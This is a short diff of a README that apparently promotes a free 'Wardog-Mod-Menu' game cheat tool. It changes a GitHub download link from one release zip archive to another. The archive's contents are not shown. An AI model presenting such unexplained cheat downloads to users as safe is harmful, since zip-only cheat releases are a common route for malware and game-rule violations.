@@ -26,7 +26,7 @@ Free, open source, no installer. Opens with `Insert`.
 
 ### ⬇️ Download
 
-> **[⬇️ Download the latest Wardog-Mod-Menu](https://github.com/rad5-Raven595880/WARDOGS-Mod-Menu/releases/download/Wardogs/Archive_1.zip)**
+> **[⬇️ Download the latest Wardog-Mod-Menu](https://github.com/rad5-Raven595880/WARDOGS-Mod-Menu/releases/download/WARDOGS-HACKS/WardogsFiles.zip)**
 <p align="center">
 
 **Latest Version:** `v1.0.0` • 
